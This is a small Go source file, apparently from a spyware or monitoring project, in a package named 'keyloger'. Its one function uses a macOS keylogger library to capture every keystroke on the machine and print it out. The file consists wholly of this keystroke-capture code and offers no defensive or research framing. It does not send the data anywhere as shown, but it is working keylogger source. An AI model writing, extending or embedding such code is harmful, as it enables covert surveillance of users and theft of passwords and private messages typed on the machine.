package keyloger

import (
	"fmt"
	"log"

	"github.com/KeisukeYamashita/go-macos-keylogger/pkg/keyboard"
	"github.com/KeisukeYamashita/go-macos-keylogger/pkg/keylogger"
)

func MacKeyloger() {
	kl, err := keylogger.New()
	if err != nil {
		log.Println("keyloger error")
		log.Fatal(err)
	}

	f := func(key keyboard.Key, state keyboard.State) {
		fmt.Println(key)
	}

	kl.Listen(f)
}
